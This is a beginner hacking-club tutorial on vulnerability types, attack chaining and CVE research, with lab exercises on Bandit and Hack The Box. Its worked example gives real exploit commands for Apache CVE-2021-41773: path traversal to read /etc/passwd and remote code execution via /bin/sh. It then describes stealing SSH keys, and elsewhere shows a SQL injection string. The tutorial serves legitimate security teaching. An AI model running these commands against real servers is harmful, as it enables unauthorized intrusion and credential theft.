## **1. What Is a Vulnerability?**

A vulnerability is a weak spot in a system. A crack in the armor.

**Hackers don't look at systems the way normal people do.** Where a regular user sees a website, a login form, a router. Hacker sees potential:

- That login form? Maybe the inputs aren't filtered.
- That exposed service? Maybe it's running outdated software.
- That "hidden" admin page? Maybe there's no access control.

**Vulnerabilities rarely exist alone.** The real damage happens when you _combine_ weak spots, stacking small mistakes into full compromise.

Every vulnerability type has a question or a thing where it occurs. When you know where they occur, you know where to focus your energy. This is only true with common vulnerabilities, that happen a lot.

## **2. What Looks Innocent to Others — Looks Valuable to You**

- Version numbers → fingerprinting targets.
- Login forms → injection opportunities.
- Open ports → exposed services.
- Default creds → free access.
- Error messages → information leakage.

A hacker sees systems like puzzle pieces, the trick is spotting how they fit together. Any kind of information of the system is valuable. The better you can identify the system, the wider attack surface you have. This helps you in the initial weak spot stage.

## **3. The Main Types of Vulnerabilities**

These are most common categories, learn them like a mental checklist every time you assess a system.

### **A. Misconfiguration**

- **What:** System set up wrong or left wide open.
- **Where:** Exposed admin panels, open ports, default settings.
- **Impact:** Easy unauthorized access, pivot points.
- **Example:** Jenkins web UI exposed to the internet with no auth.

---

### **B. Injection**

- **What:** Sending input that executes unintended commands or queries.
- **Where:** Web forms, APIs, search boxes.
- **Impact:** Database dumps, remote code execution, system compromise.
- **Example:** SQL Injection: `' OR 1=1--`

---

### **C. Broken Access Control**

- **What:** Access granted without proper checks.
- **Where:** Hidden URLs, API endpoints, user role flaws.
- **Impact:** Privilege escalation, unauthorized admin access.
- **Example:** `/admin` page accessible without authentication.

---

### **D. Insecure Defaults**

- **What:** Systems ship insecure, often with default creds or settings.
- **Where:** IoT devices, CMS installs, routers.
- **Impact:** Initial access without effort.
- **Example:** Router with default `admin:admin` login.

---

### **E. Unpatched Vulnerabilities**

- **What:** Known software flaws left unfixed.
- **Where:** Everywhere — operating systems, web servers, apps.
- **Impact:** Known exploits work out of the box.
- **Example:** EternalBlue exploited SMB flaw (CVE-2017-0144).

## **4. How Hackers Really Use Vulnerabilities**

Hackers don’t care about _individual_ vulnerabilities, they care about **attack chains**. One vulnerability is just one step closer to valuable data.

**The cycle looks like this:**

1. **Find weak spot #1** — maybe low impact alone.
2. **Pivot** — use that to access another system or escalate.
3. **Stack weak spots** — chain vulnerabilities.
4. **Full compromise** — access, control, persistence.

![[../../Pasted image 20250701010904.png]]

## **5. Your Key Resource: CVE.org**

**CVE = Common Vulnerabilities and Exposures**  
It's the global dictionary of known weaknesses.

- Search for software, version numbers, keywords.
- Get vulnerability ID, description, severity.
- See how others exploit flaws.

**Example workflow:**

- You scan a system → find it's running Apache 2.4.49.
- You search `Apache 2.4.49 vulnerability site:cve.org`.
- You find CVE-2021-41773. A path traversal + RCE exploit.
- Now, you know there's a known weakness. You research the exploit, test safely in lab.

**Rule:** Always verify versions before attacking blindly. Smart hackers research and test first.

## **6. Mini-Exercise:  Your First Weak Spots (Bandit)**

**Goal:** Learn how small mistakes (misconfigurations, hidden files) allow progression.  
**Platform:** [OverTheWire Bandit](https://overthewire.org/wargames/bandit/)
**Task:**

- Complete Levels 0–4.
- Focus on:  
    ✅ Enumeration (finding hidden files)  
    ✅ Input handling quirks  
    ✅ Small misconfigurations
- Reflect: Each "level" is a simplified version of a real vulnerability in action.

## **7. Full Example: Small Weak Spots To Full Compromise**

Let’s walk through a realistic beginner scenario, from nothing to full access.

### **Target:** A small company website hosted on a public server

Your mission: Find the weaknesses, pivot, chain them, own the box.

### **Step 1: Recon**

**Tool:** `nmap`

``` bash
sudo nmap -sV targetsite.com
```

**Results:**

- Port 80 open - Apache 2.4.49
- Port 22 open - SSH

### **Step 2: Identify Vulnerability**

- You spot the Apache version.
- You hit [cve.org](https://www.cve.org). Search `Apache 2.4.49`.
- You find **CVE-2021-41773**. Path traversal exploit confirmed.

---

### **Step 3: Exploit the Weakness**

You craft a malicious URL:

``` bash
curl http://targetsite.com/cgi-bin/.%2e/%2e%2e/%2e%2e/etc/passwd
```

**Result:** You successfully read `/etc/passwd`. Proof of path traversal.

### **Step 4: Pivot**

**Why stop at reading files?** Research shows CVE-2021-41773 can allow Remote Code Execution (RCE) if mod_cgi is enabled.

**Exploit attempt:**

``` bash
curl -d 'echo "hacked" > /tmp/pwned' http://targetsite.com/cgi-bin/.%2e/%2e%2e/%2e%2e/bin/sh
```

Assuming mod_cgi is active, you've now run commands on the server.

### **Step 5: Further Pivot**

With command execution:

- You explore the file system.
- You find an `.ssh` folder.
- You dump SSH private keys.
- You connect via SSH:

```bash
ssh -i id_rsa user@targetsite.com
```

**Now:** You have persistent shell access.

This probably seems really complicated right now. And you don't need to know how everything works, but you understand the concept behind the exploitation loop. This is how valuable vulnerabilities are found. It's a chain, not one click to the end. Hacking is slow, everything takes time and you need to go trough a lot of nothing before you hit the weak spot. Hacking requires a lot of patience.

## **8. Quick Tips for Beginner Hackers**

- Don’t rush,  map the system before exploiting.
- Research every version number, service, and detail. And document it separately.
- CVE.org, Exploit-DB, check them constantly and if you don't understand something, learn it before you move on.
- Assume the first vuln isn't the last, pivot and chain.
- Practice only in safe labs or with permission. **Never attack without permission.**

### **4. Final Assignment: Hack The Box Starting Point**

**Goal:** Apply everything — recon, vulnerability identification, chaining, access.  
**Platform:** [Hack The Box](https://app.hackthebox.com/starting-point)  
**Recommended Target:** `Archetype`, beginner-friendly, clear steps, real-world feel.
![[../../Pasted image 20250701002636.png]]
![[../../Pasted image 20250701002831.png]]
You can find the machine under `Starting Point - Tier 2 tab`. From there you can spawn the the machine, after you have connected to HackTheBox Servers, with eighter Pwnbox or OpenVPN. Don't know how to connect? Refer to [how to connect](https://help.hackthebox.com/en/articles/5185687-introduction-to-lab-access).

**Assignment Breakdown:**  
 ✅ Recon the target (use `nmap`).  
 ✅ Identify exposed services.  
 ✅ Research known vulnerabilities (CVE.org, Exploit-DB).  
 ✅ Exploit the weak spot.  
 ✅ Gain access and escalate if applicable.

**End-of-Chapter Reflection:**

- What vulnerabilities existed?
- How did they stack?
- How did research tools (like CVE.org) guide your actions?

Now you can keep doing the Starting point and OverTheWire. These platforms are a standard for our club.

### **3. Error Handling / Real-World Frustrations Acknowledgement**

Even in Bandit or HTB, they’ll hit:

- SSH connection issues
- Typos
- Misinterpreted outputs

**Solution:**  
Quick “Stuck?” sidebars — common errors, where to check, reminder not to panic.  
Keeps motivation intact when inevitable tech hiccups happen.

### **4. Brief "How to Think When Stuck" Mini-Section**

Many new hackers freeze when tools fail or outputs aren't clear. Teach:

- Re-read the basics (port numbers, versions, configs).
- Break the problem into smaller pieces.
- Research keywords, error messages.
- Ask, _“What would an attacker test here?”_
